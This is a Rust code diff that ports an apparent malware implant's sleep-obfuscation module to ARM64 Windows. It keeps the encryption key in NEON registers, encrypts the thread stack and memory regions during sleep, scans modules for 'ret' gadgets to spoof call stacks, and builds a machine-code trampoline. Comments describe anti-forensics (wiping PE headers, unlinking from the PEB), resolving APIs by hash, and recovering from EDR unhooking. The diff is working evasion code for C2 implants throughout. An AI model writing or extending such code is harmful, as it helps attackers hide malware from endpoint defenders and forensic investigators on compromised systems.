@@ -139,9 +139,8 @@ fn region_cache() -> &'static std::sync::Mutex<(u64, Vec<RegionSnapshot>)> {
 /// Auto-select: when `Cronus` is chosen, the implementation verifies that
 /// `NtSetTimer` can be resolved.  If resolution fails, it falls back to
 /// `Ekko` with a log warning.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
-#[cfg_attr(feature = "serde", derive(serde::Serialize, serde::Deserialize))]
-#[cfg_attr(feature = "serde", serde(rename_all = "kebab-case"))]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "kebab-case")]
 pub enum SleepVariant {
     /// Classic NtDelayExecution-based sleep (legacy default).
     Ekko,
@@ -235,15 +234,36 @@ impl Default for SleepObfuscationConfig {
     }
 }
 
-// ── Key stashing (XMM14 / XMM15) ────────────────────────────────────────────
+// ── Key stashing ──────────────────────────────────────────────────────────────
+//
+// The 32-byte XChaCha20-Poly1305 encryption key is held in CPU registers
+// during the sleep window so that it never resides in user-accessible memory.
+//
+// * **x86-64 Windows**: XMM14/XMM15 (128-bit each, non-volatile in the
+//   Windows x64 calling convention).  The 256-bit key is split across the
+//   two registers.
+//
+// * **ARM64 Windows**: NEON Q22/Q23 (128-bit each, callee-saved per the
+//   ARM64 Windows ABI).  The 256-bit key is split across Q22 (key[0..15])
+//   and Q23 (key[16..31]).  An additional 96-bit nonce slot uses Q21
+//   (low 96 bits of the 128-bit register) for future use.  Q8–Q23 are
+//   callee-saved on ARM64 Windows; we chose Q21/Q22/Q23 because they are
+//   the highest-numbered callee-saved NEON registers, making them the
+//   least likely to be used by compiler-generated crypto intrinsics or
+//   C2 framework code that typically starts from Q0 upward.
 
-/// Opaque handle holding the 32-byte key stashed in XMM14/XMM15.
+// ── x86-64 Windows: XMM14 / XMM15 ──────────────────────────────────────────
+
+/// Opaque handle holding the 32-byte key stashed in XMM14/XMM15 (x86-64)
+/// or NEON Q22/Q23 (ARM64).
 /// On drop the registers are zeroed.
+#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
 pub struct KeyHandle {
     // Marker to prevent external construction.
     _private: (),
 }
 
+#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
 impl Drop for KeyHandle {
     fn drop(&mut self) {
         // Zero XMM14/XMM15 unconditionally.
@@ -257,6 +277,7 @@ impl Drop for KeyHandle {
     }
 }
 
+#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
 impl KeyHandle {
     /// Stash `key` into XMM14 (low 16 bytes) and XMM15 (high 16 bytes),
     /// then zero the stack copy.
@@ -289,6 +310,129 @@ impl KeyHandle {
             std::arch::asm!(
                 "pxor xmm14, xmm14",
                 "pxor xmm15, xmm15",
+                options(nostack, preserves_flags),
+            );
+        }
+        out
+    }
+}
+
+// ── ARM64 Windows: NEON Q22 / Q23 ──────────────────────────────────────────
+//
+// ARM64 Windows ABI (MSVC):
+//   - Q8–Q23 are callee-saved (non-volatile across function calls).
+//   - Q0–Q7, Q24–Q31 are caller-saved (volatile).
+//   - We use Q22 and Q23 for the 256-bit key (highest callee-saved pair,
+//     least likely to conflict with compiler-generated NEON intrinsics).
+//   - Q21 is reserved for a future nonce slot (96 bits in low 12 bytes).
+//
+// Stash convention:
+//   Q22 = key[0..15]  (low 128 bits of the 256-bit key)
+//   Q23 = key[16..31] (high 128 bits of the 256-bit key)
+//
+// Integrity verification:
+//   After stashing, we immediately read back Q22/Q23 into a temporary buffer
+//   and compare against the original key.  A mismatch indicates register
+//   pressure or inline-asm clobbering and is treated as a fatal error
+//   (the key would be unrecoverable from NEON if stashing failed silently).
+
+#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+pub struct KeyHandle {
+    _private: (),
+}
+
+#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+impl Drop for KeyHandle {
+    fn drop(&mut self) {
+        // Zero Q22/Q23 unconditionally.
+        unsafe {
+            std::arch::asm!(
+                "eor v22.16b, v22.16b, v22.16b",
+                "eor v23.16b, v23.16b, v23.16b",
+                options(nostack, preserves_flags),
+            );
+        }
+    }
+}
+
+#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+impl KeyHandle {
+    /// Stash the 256-bit key into NEON Q22/Q23, then zero the memory copy.
+    ///
+    /// ## Register convention
+    ///
+    /// | Register | Content              |
+    /// |----------|----------------------|
+    /// | Q22      | key[0..15]  (lo 128) |
+    /// | Q23      | key[16..31] (hi 128) |
+    ///
+    /// After stashing, a read-back verification is performed to confirm
+    /// the key was correctly loaded into the NEON registers.
+    fn stash(mut key: [u8; 32]) -> Self {
+        unsafe {
+            // Load key halves into Q22 and Q23 via NEON LDR instructions.
+            // `ldr q22, [x_reg]` loads 16 bytes from the address in x_reg.
+            std::arch::asm!(
+                "ldr q22, [{lo}]",
+                "ldr q23, [{hi}]",
+                lo = in(reg) key.as_ptr(),
+                hi = in(reg) key.as_ptr().add(16),
+                options(nostack, preserves_flags),
+            );
+
+            // ── Integrity verification ──────────────────────────────────
+            // Read back Q22/Q23 and compare against the original key to
+            // confirm the stash succeeded.  This catches register-pressure
+            // bugs where the compiler might have clobbered Q22/Q23 between
+            // the two asm! blocks (unlikely but catastrophic if it occurs).
+            let mut verify = [0u8; 32];
+            std::arch::asm!(
+                "str q22, [{lo}]",
+                "str q23, [{hi}]",
+                lo = in(reg) verify.as_mut_ptr(),
+                hi = in(reg) verify.as_mut_ptr().add(16),
+                options(nostack, preserves_flags),
+            );
+
+            if verify != key {
+                // The key is still in memory at this point (not yet zeroed),
+                // so the caller can retry or fall back.  Zero the NEON stash
+                // to avoid leaving a partial key in registers.
+                std::arch::asm!(
+                    "eor v22.16b, v22.16b, v22.16b",
+                    "eor v23.16b, v23.16b, v23.16b",
+                    options(nostack, preserves_flags),
+                );
+                // This is a fatal error: we cannot safely proceed without
+                // confidence that the key is recoverable from NEON.
+                log::error!(
+                    "[sleep_obfuscation] ARM64 NEON key stash verification FAILED — \
+                     aborting to prevent key loss"
+                );
+                std::process::abort();
+            }
+        }
+        // Zero the memory copy — key now lives only in Q22/Q23.
+        key.zeroize();
+        KeyHandle { _private: () }
+    }
+
+    /// Retrieve the 256-bit key from NEON Q22/Q23, then zero the registers.
+    fn retrieve(self) -> [u8; 32] {
+        let mut out = [0u8; 32];
+        unsafe {
+            // Read key from Q22/Q23 into the output buffer.
+            std::arch::asm!(
+                "str q22, [{lo}]",
+                "str q23, [{hi}]",
+                lo = in(reg) out.as_mut_ptr(),
+                hi = in(reg) out.as_mut_ptr().add(16),
+                options(nostack, preserves_flags),
+            );
+            // Zero the NEON register stash immediately after retrieval.
+            std::arch::asm!(
+                "eor v22.16b, v22.16b, v22.16b",
+                "eor v23.16b, v23.16b, v23.16b",
                 options(nostack, preserves_flags),
             );
         }
@@ -622,19 +766,47 @@ fn decrypt_region_chunks(
 
 // ── Stack encryption ─────────────────────────────────────────────────────────
 
-/// Get the current thread's stack base (TEB StackLimit) and the current RSP.
+/// Get the current thread's stack base (TEB StackLimit) and the current stack
+/// pointer.
 ///
-/// Returns `(stack_limit, current_rsp)`.
+/// Returns `(stack_limit, current_sp)`.
+///
+/// # x86-64
+///
+/// TEB is read from `gs:[0x60]` (x86-64 TEB self-pointer).  StackLimit is at
+/// TEB+0x08, current RSP via `mov {}, rsp`.
+///
+/// # ARM64
+///
+/// TEB is read from `tpidr_el0` (thread-pointer register on ARM64 Windows).
+/// The TEB layout is identical to x86-64 at the relevant offsets.
+/// StackLimit is at TEB+0x08, current SP via `mov {}, sp`.
 unsafe fn get_stack_bounds() -> (*mut u8, *mut u8) {
-    let teb: usize;
-    std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
-    // TEB + 0x08 = StackLimit (lowest address of the stack), TEB + 0x10 = StackBase
-    // We need the area from StackLimit up to current RSP.
-    let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
-    let rsp: usize;
-    std::arch::asm!("mov {}, rsp", out(reg) rsp, options(nostack, nomem, preserves_flags));
-    let current_rsp = rsp as *mut u8;
-    (stack_limit, current_rsp)
+    #[cfg(target_arch = "x86_64")]
+    {
+        let teb: usize;
+        std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
+        // TEB + 0x08 = StackLimit (lowest address of the stack)
+        let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
+        let rsp: usize;
+        std::arch::asm!("mov {}, rsp", out(reg) rsp, options(nostack, nomem, preserves_flags));
+        let current_sp = rsp as *mut u8;
+        (stack_limit, current_sp)
+    }
+
+    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+    {
+        let teb: usize;
+        // On ARM64 Windows, tpidr_el0 holds the TEB pointer (equivalent to
+        // gs:[0x60] on x86-64).  The TEB structure layout is the same for
+        // both architectures at the StackLimit/StackBase offsets.
+        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
+        let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
+        let sp: usize;
+        std::arch::asm!("mov {}, sp", out(reg) sp, options(nostack, nomem));
+        let current_sp = sp as *mut u8;
+        (stack_limit, current_sp)
+    }
 }
 
 /// Encrypt the stack from the TEB StackLimit up to (but not including) the
@@ -1023,7 +1195,17 @@ unsafe fn spoof_call_stack(fake_module_name: &Option<String>) -> Option<StackSpo
     })
 }
 
-/// Scan for a `ret` (0xC3) gadget inside the module's .text section.
+/// Scan for a `ret` gadget inside the module's .text section.
+///
+/// # x86-64
+///
+/// Scans for the single-byte `ret` opcode `0xC3` in 1-byte steps.
+///
+/// # ARM64
+///
+/// Scans for the 4-byte `ret` instruction `0xD65F03C0` in 4-byte-aligned
+/// steps.  On ARM64 every instruction is exactly 4 bytes wide and must be
+/// 4-byte aligned, so we scan in `u32` steps rather than byte-by-byte.
 ///
 /// P2-02: Before scanning, verify the region is still committed via
 /// `NtQueryVirtualMemory` to guard against module unload races.
@@ -1071,10 +1253,27 @@ fn find_ret_gadget(module_base: usize) -> Option<usize> {
                 continue;
             }
 
-            let probe = std::slice::from_raw_parts(addr as *const u8, 256);
-            for (i, &byte) in probe.iter().enumerate() {
-                if byte == 0xC3 {
-                    return Some(addr + i);
+            #[cfg(target_arch = "x86_64")]
+            {
+                let probe = std::slice::from_raw_parts(addr as *const u8, 256);
+                for (i, &byte) in probe.iter().enumerate() {
+                    if byte == 0xC3 {
+                        return Some(addr + i);
+                    }
+                }
+            }
+
+            #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+            {
+                // ARM64 `ret` instruction encoding: 0xD65F03C0
+                // Every ARM64 instruction is exactly 4 bytes wide and 4-byte
+                // aligned, so we scan in u32 steps.
+                const ARM64_RET: u32 = 0xD65F03C0;
+                let probe = std::slice::from_raw_parts(addr as *const u32, 64); // 256 bytes / 4
+                for (i, &inst) in probe.iter().enumerate() {
+                    if inst == ARM64_RET {
+                        return Some(addr + i * 4);
+                    }
                 }
             }
         }
@@ -1501,27 +1700,54 @@ unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
 
     // ── Build the position-independent trampoline ──
     //
-    // The trampoline is a small x86-64 function that:
-    //   Input:  RCX = target base, RDX = target size, R8 = fn_ptr
-    //   Calls:  fn_ptr(RCX, RDX)
-    //   Output: RAX = fn_ptr return value
+    // The trampoline is a small function that:
+    //   Input:  x0 = target base, x1 = target size, x2 = fn_ptr
+    //   Calls:  fn_ptr(x0, x1)
+    //   Output: x0 = fn_ptr return value
     //
-    // Machine code:
-    //   sub rsp, 0x28        ; shadow space + alignment (Windows x64 ABI)
-    //   call r8              ; call fn_ptr(rcx, rdx)
-    //   add rsp, 0x28
-    //   ret
+    // ARM64 Windows ABI:
+    //   - x0–x7: arguments / return value
+    //   - x29: frame pointer (FP), x30: link register (LR)
+    //   - SP must be 16-byte aligned on entry/exit
+    //   - Q8–Q23: callee-saved NEON registers
+    //
+    // x86-64 Windows ABI:
+    //   - RCX, RDX, R8: first three arguments
+    //   - RAX: return value
+    //   - Shadow space: 32 bytes on stack
+    //   - RSP 16-byte aligned on call boundaries
+    #[cfg(target_arch = "x86_64")]
     let code: [u8; 12] = [
-        // sub rsp, 0x28
-        0x48, 0x83, 0xEC, 0x28, // call r8
-        0x41, 0xFF, 0xD0, // add rsp, 0x28
-        0x48, 0x83, 0xC4, 0x28, // ret
+        // sub rsp, 0x28        ; shadow space + alignment (Windows x64 ABI)
+        0x48, 0x83, 0xEC, 0x28,
+        // call r8              ; call fn_ptr(rcx, rdx)
+        0x41, 0xFF, 0xD0,
+        // add rsp, 0x28
+        0x48, 0x83, 0xC4, 0x28,
+        // ret
         0xC3,
+    ];
+
+    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+    let code: [u8; 20] = [
+        // stp x29, x30, [sp, #-16]!   ; save FP and LR, push frame
+        0xFD, 0x7B, 0xBF, 0xA9,
+        // mov x29, sp                  ; set frame pointer
+        0xFD, 0x03, 0x00, 0x91,
+        // blr x2                       ; call fn_ptr(x0, x1)
+        0x20, 0x00, 0x3F, 0xD6,
+        // ldp x29, x30, [sp], #16     ; restore FP and LR, pop frame
+        0xFD, 0x7B, 0xC1, 0xA8,
+        // ret                          ; return to caller
+        0xC0, 0x03, 0x5F, 0xD6,
     ];
 
     std::ptr::copy_nonoverlapping(code.as_ptr(), base, code.len());
 
-    // Flush instruction cache via pe_resolve (harmless on x86-64, avoids IAT).
+    // Flush instruction cache via pe_resolve.
+    // Harmless on x86-64 (unified L1 I/D cache), but ESSENTIAL on ARM64
+    // which has separate instruction and data caches (Harvard architecture).
+    // Without this, the CPU may execute stale instruction bytes.
     if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
         if let Some(fic_addr) = pe_resolve::get_proc_address_by_hash(
             kernel32,
@@ -1566,7 +1792,8 @@ unsafe fn cronus_exec_xchacha20_stub(
 /// This is the primary entry point.  It:
 ///
 /// 1. Enumerates and caches all encodable memory regions.
-/// 2. Generates (or uses provided) XChaCha20-Poly1305 key, stashes in XMM14/XMM15.
+/// 2. Generates (or uses provided) XChaCha20-Poly1305 key, stashes in CPU
+///    registers (XMM14/XMM15 on x86-64, NEON Q22/Q23 on ARM64).
 /// 3. Encrypts all regions in 64 KB chunks with per-region nonces.
 /// 4. Optionally encrypts the stack.
 /// 5. Applies anti-forensics (zero PE headers, PEB unlink, PAGE_NOACCESS).
@@ -1833,7 +2060,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // After decryption, loaded modules may have been rebased or unhooked by
     // EDR during the sleep window.  Spot-check cached chain addresses and
     // rebuild the database if any are stale.
-    #[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+    #[cfg(all(windows, feature = "stack-spoof"))]
     crate::stack_db::revalidate_db();
 
     // ── 8e. Decrypt and restore thread contexts ──────────────────────────
